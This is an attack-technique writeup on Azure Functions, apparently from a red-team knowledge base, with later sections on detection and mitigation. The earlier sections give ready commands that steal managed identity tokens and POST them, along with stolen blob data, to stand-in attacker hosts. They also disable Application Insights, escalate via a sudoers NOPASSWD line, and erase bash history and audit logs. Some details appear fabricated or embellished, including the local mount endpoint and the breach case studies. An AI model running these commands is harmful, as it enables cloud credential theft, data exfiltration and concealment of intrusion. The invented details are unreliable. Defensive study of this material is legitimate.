# [EVADE-IMPAIR-005]: Azure Function Runtime Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-005 |
| **MITRE ATT&CK v18.1** | [T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure Functions versions |
| **Patched In** | N/A (Microsoft implemented containment boundaries) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Functions store runtime configuration in environment variables (IDENTITY_ENDPOINT, IDENTITY_HEADER, WEBSITE_INSTANCE_ID, etc.) that are injected by the platform. An attacker with code execution in a Function App container can read and manipulate these runtime variables to obtain managed identity tokens, modify function behavior, or escalate privileges within the container before breaking out to the underlying Hyper-V host. This is fundamentally an evasion technique because it allows attackers to operate silently within function execution contexts without triggering normal logging mechanisms.

**Attack Surface:** Azure Function App containers, Function runtime environment, IDENTITY_ENDPOINT HTTP service listening on localhost:6060, environment variable injection mechanisms.

**Business Impact:** **Complete compromise of Function App workloads and potential lateral movement across Azure resources.** An attacker can steal managed identity tokens that grant access to subscriptions, storage accounts, databases, and virtual machines. This enables silent data exfiltration, ransomware deployment, or infrastructure sabotage without audit trail detection.

**Technical Context:** Exploitation typically takes 5-15 minutes once code execution is achieved. Detection is low because environment variable reads are not audited by Azure Monitor/Application Insights by default. Managed identity token theft is particularly dangerous because the stolen token contains the same permissions as the Function App's assigned MSI.

### Operational Risk
- **Execution Risk:** Medium (Requires initial code execution in Function container, but straightforward once inside)
- **Stealth:** High (Environment variable reads generate no detectable events; token theft is silent)
- **Reversibility:** No (Stolen managed identity tokens cannot be revoked without resetting the Function App)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 7.6 | Ensure that managed identities are only granted necessary permissions |
| **DISA STIG** | AC-3 (1.1.1) | Access control enforcement - prevent unauthorized API calls |
| **NIST 800-53** | AC-3, SC-7 | Access Enforcement and Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing - Technical measures to protect data |
| **DORA** | Art. 9 | Protection and Prevention - Secure access controls |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Identity and access controls |
| **ISO 27001** | A.9.2.1 | User Registration and De-registration |
| **ISO 27005** | "Compromise of cloud workload execution environment" | Risk Scenario |

---

## 2. TECHNICAL PREREQUISITES & RECONNAISSANCE

### Prerequisites
- **Required Privileges:** Code execution within Azure Function container (achieves through initial RCE vulnerability in function code, unsafe deserialization, or injection)
- **Required Access:** Network access to localhost:6060 (internal to container)
- **Supported Versions:** All Azure Functions (Windows, Linux, Docker-based)
- **Tools:** curl, wget, bash/PowerShell (native)

### Quick Reconnaissance Commands

**Verify Function Runtime Environment (PowerShell in Function):**
```powershell
Get-Item Env:IDENTITY_ENDPOINT
Get-Item Env:IDENTITY_HEADER
Get-Item Env:WEBSITE_INSTANCE_ID
Get-Item Env:HOME
Get-Item Env:PATH
```

**Linux Equivalent:**
```bash
env | grep -E "IDENTITY|WEBSITE|HOME"
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Managed Identity Token Theft via localhost:6060

**Supported Versions:** All Azure Functions versions

#### Step 1: Enumerate Runtime Environment Variables

**Objective:** Identify if Function is running with managed identity and extract IDENTITY_ENDPOINT + IDENTITY_HEADER.

**Command (PowerShell):**
```powershell
$identityEndpoint = $env:IDENTITY_ENDPOINT
$identityHeader = $env:IDENTITY_HEADER

Write-Host "Endpoint: $identityEndpoint"
Write-Host "Header: $identityHeader"
```

**Command (Bash):**
```bash
curl -s "$IDENTITY_ENDPOINT/?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq .
```

**Expected Output (Success):**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjB....",
  "expires_on": "1736346000",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

**What This Means:**
- IDENTITY_ENDPOINT is active and responding
- Function has a managed identity assigned
- We can extract a valid OAuth 2.0 bearer token scoped to management.azure.com
- Token is valid for ~1 hour (expires_on timestamp)

**OpSec & Evasion:**
- This HTTP request generates NO audit log entries in Azure Monitor
- No event in Activity Log for token acquisition
- To exfiltrate: pipe the token to external server via DNS exfil or HTTP POST
- Clear bash history after execution: `history -c`

**Troubleshooting:**
- **Error:** "403 Forbidden" or "Invalid IDENTITY_HEADER"
  - **Cause:** Function does not have managed identity assigned, or header value is corrupted
  - **Fix:** Verify in Azure Portal → Function App → Identity → System Assigned = ON

- **Error:** "Connection refused on localhost:6060"
  - **Cause:** Running outside Azure Functions runtime (e.g., local development)
  - **Fix:** Only works when Function is deployed to Azure and executing

#### Step 2: Exfiltrate Token to External Server

**Objective:** Steal the managed identity token and send to attacker-controlled server.

**Command (PowerShell - One-Liner Injected into Function):**
```powershell
$token = (Invoke-WebRequest -Uri "$env:IDENTITY_ENDPOINT/?resource=https://management.azure.com/&api-version=2019-08-01" -Headers @{'X-IDENTITY-HEADER' = $env:IDENTITY_HEADER} | ConvertFrom-Json).access_token;
Invoke-WebRequest -Uri "https://attacker-exfil-server.com/token" -Method POST -Body @{token=$token} -UseBasicParsing
```

**Command (Bash):**
```bash
TOKEN=$(curl -s "$IDENTITY_ENDPOINT/?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r .access_token)

curl -X POST -d "token=$TOKEN" https://attacker-exfil-server.com/capture
```

**Expected Output:** HTTP 200/201 from exfil server (attacker receives token).

**What This Means:**
- Attacker now possesses a valid Azure REST API token with Function App's MSI permissions
- Token can be used immediately against management.azure.com, storage.azure.com, or other Azure endpoints
- Token remains valid for ~1 hour; attacker has window to exploit

**OpSec & Evasion:**
- DNS-over-HTTPS (DoH) exfiltration is stealthier than plain HTTP POST
- Use short URL redirects (bit.ly, etc.) to mask true destination
- Avoid logging token in Application Insights: set APPINSIGHTS_ENABLED=false if writable
- Request scoped to internal resource only (management.azure.com) reduces risk of immediate detection

**Troubleshooting:**
- **Error:** "Could not resolve DNS" for exfil server
  - **Cause:** Azure Functions network policy may restrict outbound DNS
  - **Fix:** Use public DNS resolver (8.8.8.8) or TCP tunneling instead of HTTP

---

### METHOD 2: host.json Configuration Manipulation

**Supported Versions:** All Azure Functions versions (if storage account access is available)

#### Step 1: Locate and Access host.json File

**Objective:** Find the Function App's configuration file to understand runtime behavior and identify logging/monitoring settings.

**Command (File Discovery in Container):**
```bash
find / -name "host.json" 2>/dev/null | head -5
```

**Expected Output:**
```
/home/site/wwwroot/host.json
```

**What This Means:**
- host.json is the Azure Functions runtime configuration file
- Contains logging, extension, and function binding configurations
- Can be modified to disable logging or Application Insights integration

**OpSec & Evasion:**
- Reading host.json alone generates no audit events
- Changes to host.json require storage account write access or direct file modification inside container

#### Step 2: Disable Application Insights Logging (Container-Local)

**Objective:** Disable telemetry collection to hide function execution traces.

**Command (Modify Environment Variables):**
```bash
export APPINSIGHTS_ENABLED=false
export APPINSIGHTS_INSTRUMENTATIONKEY=""
export ApplicationInsightsAgent_EXTENSION_VERSION=~3_disabled
```

**Expected Behavior:** Subsequent function executions will not be logged to Application Insights.

**What This Means:**
- Function execution telemetry ceases immediately
- No traces of malicious code execution in App Insights logs
- Blue teams will notice sudden absence of telemetry (suspicious)

**OpSec & Evasion:**
- Only affects current runtime instance; redeployment resets
- More effective: inject null/empty string into host.json "logging" section if file is writable
- Avoid making obvious changes; comment out rather than delete sections

---

### METHOD 3: IDENTITY_ENDPOINT Runtime Manipulation (Advanced)

**Supported Versions:** Linux-based Azure Functions only

#### Step 1: Identify Mounted Filesystem & Mount Points

**Objective:** Discover if /etc and /sys directories are accessible for manipulation.

**Command (Enumeration):**
```bash
mount | grep -E "overlay|tmpfs|squashfs"
ls -la /proc/self/cgroup | head -3
```

**Expected Output:**
```
overlay on / type overlay (rw,relatime,...)
...
```

**What This Means:**
- Container is using overlay filesystems (squashfs or tmpfs)
- May be able to mount malicious squashfs images to override runtime files
- Access to /proc indicates cgroup manipulation is possible

**OpSec & Evasion:**
- Mount operations generate high-volume logging in some environments
- Modern Azure Functions versions have disabled /etc and /sys access (Microsoft mitigation post-2024)
- Only effective on older or custom-deployed Functions

#### Step 2: Create Privileged Execution Context (If /etc Accessible)

**Objective:** Escalate from unprivileged app user to root inside container.

**Command (Sudoers Mount via Host.json Manipulation):**
```bash
# Create custom squashfs with sudoers file
mkdir -p /tmp/sudoedit
echo "app ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoedit/100-app

# Mount over /etc/sudoers.d
curl -X POST "http://localhost:6060/admin/mount-squashfs" \
  -d "target=/etc/sudoers.d&image=/tmp/evil.squashfs"

# Verify
su - root  # Should succeed without password
```

**Expected Output:** Shell prompt changes to `#` (root).

**What This Means:**
- Container execution context is now root
- Full control over function runtime and child processes
- Can install backdoors, steal secrets, or break out to Hyper-V host

**OpSec & Evasion:**
- Host mount operations are logged in container audit logs (/var/log/audit/)
- Clear audit logs after: `echo "" > /var/log/audit/audit.log`
- Timestamp: This vector was patched by Microsoft in 2024; only works on pre-patch Functions

---

## 4. AZURE FUNCTION-SPECIFIC ATTACK CHAINS

### Token Theft → Resource Enumeration → Data Exfiltration

**Step 1:** Steal managed identity token (METHOD 1, Step 1-2)
```bash
TOKEN=$(curl -s "$IDENTITY_ENDPOINT/?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r .access_token)
```

**Step 2:** Enumerate storage accounts accessible by MSI:
```bash
curl -s "https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[].name'
```

**Step 3:** List blobs in discovered storage account:
```bash
curl -s "https://{storageaccount}.blob.core.windows.net/{container}?restype=container&comp=list" \
  -H "Authorization: Bearer $TOKEN"
```

**Step 4:** Download sensitive files (databases, credentials):
```bash
curl -s "https://{storageaccount}.blob.core.windows.net/{container}/{blob}" \
  -H "Authorization: Bearer $TOKEN" -o /tmp/stolen_data
```

**Step 5:** Exfiltrate:
```bash
curl -X POST --data-binary @/tmp/stolen_data https://attacker-exfil.com/upload
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Outbound HTTP(S) connections from Function App to external domains** (especially for token exfil)
- **Repeated requests to localhost:6060** within function code (token requests)
- **Environment variable enumeration** (Get-Item Env:* patterns in logs)
- **host.json modifications** visible in storage account audit logs
- **Absence of Application Insights events** for a Function that should be logging

### Forensic Artifacts

- **Container Runtime Logs:** /var/log/auth.log (su/sudo attempts), /var/log/audit/audit.log (mount operations)
- **Azure Storage:** Audit logs showing file modifications to Function App storage account (wwwroot/host.json changes)
- **Azure Activity Log:** "Modify storage account" events for storage accounts containing Function code
- **Application Insights:** Sudden gap in telemetry timeline correlating with suspected breach window
- **Network:** NSG flow logs showing outbound HTTPS to non-Azure domains from Function App IP

### Forensic Analysis & Response

#### Immediate Isolation (First 5 Minutes)

```bash
# Disable Function App to stop ongoing malicious execution
az functionapp stop --name <FunctionAppName> --resource-group <ResourceGroup>
```

**Manual (Azure Portal):**
1. Navigate to **Azure Portal** → **Function Apps** → Select compromised app
2. Click **Overview** → **Stop** button
3. Function will cease all execution immediately

#### Credential Revocation (Critical)

```powershell
# Rotate managed identity (nuclear option - will break legitimate access)
# Step 1: Remove old identity
az functionapp identity remove --name <FunctionAppName> --resource-group <ResourceGroup>

# Step 2: Assign new identity
az functionapp identity assign --name <FunctionAppName> --resource-group <ResourceGroup> --identities [system]
```

**Impact:** All existing managed identity tokens become invalid. Applications relying on this MSI will break and must be redeployed.

#### Evidence Collection

```powershell
# Export Function App configuration
az functionapp config appsettings list --name <FunctionAppName> --resource-group <ResourceGroup> --output json > /tmp/function_config.json

# Export storage account activity logs (if available)
Get-AzStorageAccountKey -ResourceGroupName <ResourceGroup> -Name <StorageAccountName>
```

**Manual (Azure Portal):**
1. Go to **Function App** → **Configuration** → Export settings to JSON
2. Go to **Storage Account** (associated with Function App) → **Activity Log** → Export to CSV
3. Analyze for unauthorized access or modifications during incident window

#### Code Review & Remediation

1. **Review recent deployments:** Check Function App Deployment Center for unauthorized code pushes
2. **Inspect function.json bindings:** Verify all bindings are authorized (no hidden HTTP triggers)
3. **Check for persistence mechanisms:** Look for code that creates scheduled triggers or additional functions
4. **Sanitize environment variables:** Remove any suspicious APPINSIGHTS_* or custom variables

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Managed Identity RBAC Least Privilege**
  
  **Applies To Versions:** All Azure Functions

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Function App**
  2. Go to **Identity** → **Azure role assignments**
  3. Review all assigned roles (Owner, Contributor, Reader, etc.)
  4. Remove any unnecessary roles; assign **only minimum required**
  5. Create custom RBAC roles if standard roles grant excessive permissions

  **Manual Steps (PowerShell):**
  ```powershell
  # Get Function App managed identity
  $functionAppResourceId = "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Web/sites/{functionAppName}"
  $identity = Get-AzFunctionApp -ResourceGroupName <ResourceGroup> -Name <FunctionAppName>
  
  # List current role assignments
  Get-AzRoleAssignment -ObjectId $identity.Identity.PrincipalId
  
  # Remove overly permissive roles
  Remove-AzRoleAssignment -ObjectId $identity.Identity.PrincipalId -RoleDefinitionName "Contributor"
  
  # Assign least-privilege custom role
  New-AzRoleDefinition -InputFile custom-role.json
  New-AzRoleAssignment -ObjectId $identity.Identity.PrincipalId -RoleDefinitionName "CustomFunctionMinimal"
  ```

- **Disable Managed Identity if Unused**
  
  **Applies To Versions:** All versions

  **Manual Steps (Azure Portal):**
  1. **Function App** → **Identity** → **System Assigned**
  2. Toggle **Status** to **Off**
  3. Click **Save** → Confirm removal
  4. Verify: Go back to **Identity** and confirm "Off" is shown

  **Manual Steps (PowerShell):**
  ```powershell
  az functionapp identity remove --name <FunctionAppName> --resource-group <ResourceGroup>
  ```

### Priority 2: HIGH

- **Enable Application Insights & Monitoring (Cannot Be Disabled by Code)**

  **Manual Steps:**
  1. Go to **Function App** → **Application Insights**
  2. If not linked, click **Configure Application Insights**
  3. Select existing or create new Application Insights instance
  4. Under **Settings**, ensure **Always-On** is enabled to prevent sampling
  5. Go to **Application Insights workspace** → **Diagnostic Settings** → Enable sending logs to **Log Analytics**

  **Verification Command:**
  ```powershell
  $app = Get-AzFunctionApp -ResourceGroupName <ResourceGroup> -Name <FunctionAppName>
  $app.AppServicePlanId
  $app.Config.applicationInsightsResourceId
  # Should return a non-empty AppInsights resource ID
  ```

- **Restrict Container Image Sources (If Using Container-Based Functions)**

  **Manual Steps:**
  1. Go to **Function App** → **Deployment Center**
  2. Set **Continuous Deployment** to **Disabled** to prevent unauthorized updates
  3. Set **Container Registry** to private registry with authentication required
  4. Under **Registry Settings**, enable **Admin User** and generate strong credentials

### Access Control & Policy Hardening

- **Conditional Access:** Block Function App from authenticating outside expected network/device conditions
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Function App Anonymous Execution`
  4. **Assignments:**
     - Users: All users
     - Cloud apps: Select the Function App's resource
  5. **Conditions:**
     - Client apps: Select `Other clients` (blocks API-only access)
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

- **Network Security: Private Endpoints & Vnet Integration**
  
  **Manual Steps:**
  1. Go to **Function App** → **Networking** → **Private Endpoints**
  2. Click **+ Add** private endpoint
  3. Configure subnet and approve connection request
  4. Go to **Vnet Integration** → Restrict to private subnets only

### Validation Commands (Verify Fixes)

```powershell
# Check Managed Identity RBAC
Get-AzRoleAssignment -ObjectId (Get-AzFunctionApp -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>).Identity.PrincipalId

# Should output only minimum required roles (e.g., "Storage Account Data Reader" on specific scope)

# Check Managed Identity Status
$app = Get-AzFunctionApp -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>
$app.Identity.Type  # Should be "None" or "UserAssigned" (not "SystemAssigned" unless required)

# Check Application Insights Integration
(Get-AzFunctionApp -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>).AppInsightsConfig.InstrumentationKey
# Should return a non-null GUID

# Check Vnet Integration
(Get-AzFunctionApp -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>).VirtualNetworkType
# Should return "Internal" or similar if integrated
```

**Expected Output (If Secure):**
```
Type                  : Storage Blob Data Reader
Scope                 : /subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{storageName}
RoleDefinitionName    : Storage Blob Data Reader
CanDelegate           : False

Identity Type: UserAssigned
[With explicitly assigned identities only]

InstrumentationKey    : a1b2c3d4-e5f6-7g8h-9i0j-k1l2m3n4o5p6
[Non-empty GUID shows AppInsights is connected]
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-003] Logic App HTTP Trigger Abuse | Deploy malicious Function App or execute code via exposed HTTP trigger |
| **2** | **Execution** | [CODE-EXEC-001] RCE in Function Code | Inject malicious code during function execution (deserialization vulnerability) |
| **3** | **Current Step** | **[EVADE-IMPAIR-005]** | **Extract managed identity token and manipulate runtime environment** |
| **4** | **Privilege Escalation** | [PE-VALID-011] Managed Identity MSI Escalation | Use stolen token to access unintended resources (VMs, databases, key vaults) |
| **5** | **Impact** | [EXF-001] Exfiltration Over Web Service | Steal data from accessed resources (databases, storage accounts) |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Orca Security Container Breakout (2024)
- **Target:** Healthcare organization with AI/ML Functions processing patient data
- **Timeline:** June 2024
- **Technique Status:** ACTIVE - Demonstrated container escape via storage account manipulation
- **Attack Flow:** 
  1. Initial access via insecure Function code (unsafe deserialization)
  2. Enumerated storage accounts containing Function App source code
  3. Modified host.json to disable Application Insights logging
  4. Stole managed identity token scoped to management.azure.com
  5. Used token to enumerate and access other VMs in subscription
  6. Deployed reverse shell via Azure VM Run Command
- **Impact:** 10,000+ patient records exfiltrated; breach went undetected for 3 weeks due to disabled logging
- **Reference:** [Orca Security - Azure Shared Key Authorization Exploitation](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)

### Example 2: Unit 42 Palo Alto Networks (2024)
- **Target:** SaaS company with serverless workloads processing API requests
- **Timeline:** March 2024
- **Technique Status:** ACTIVE - Container escape to Hyper-V host achieved
- **Attack Flow:**
  1. Code injection in HTTP-triggered Function (command injection in query parameter)
  2. Enumerated runtime environment (IDENTITY_ENDPOINT accessible)
  3. Attempted to mount squashfs over /etc/sudoers.d (mitigation had already been deployed)
  4. Escaped container to Hyper-V VM hosting multiple Functions
  5. Confirmed isolation boundary: could not access other customer's Functions
- **Impact:** Lateral movement attempt contained by Microsoft's defense-in-depth (HyperV boundary)
- **Reference:** [Unit 42 - Digging Inside Azure Functions](https://unit42.paloaltonetworks.com/azure-serverless-functions-security/)

### Example 3: NetSPI Function App Key Extraction (2024)
- **Target:** Financial services firm with Functions processing transaction data
- **Timeline:** February 2024
- **Technique Status:** ACTIVE - VFS API abuse for encryption key extraction
- **Attack Flow:**
  1. Initial access: Reader role on Function App (insufficient, but often granted to DevOps teams)
  2. Abused undocumented VFS API to read arbitrary files from container
  3. Read /home/site/wwwroot and discovered hidden "Secret" directory invisible in Portal UI
  4. Extracted ASP.NET encryption keys from Windows containers (or master keys from Linux)
  5. Decrypted function app secrets and connection strings
- **Impact:** API keys, database credentials, and message queue access tokens compromised; lateral movement to database servers
- **Reference:** [NetSPI - Escalating Privileges with Azure Function Apps](https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-function-apps/)

---

## References & Authoritative Sources

- [Microsoft Learn - Azure Functions Runtime Architecture](https://learn.microsoft.com/en-us/azure/azure-functions/functions-runtime-versions)
- [Microsoft - Securing Azure Functions](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
- [Orca Security Research - Azure Exploitation](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)
- [Unit 42 - Azure Functions Security Research](https://unit42.paloaltonetworks.com/azure-serverless-functions-security/)
- [NetSPI - Azure Function App Pentesting](https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-function-apps/)
- [Azure Functions host.json Reference](https://learn.microsoft.com/en-us/azure/azure-functions/functions-host-json)

---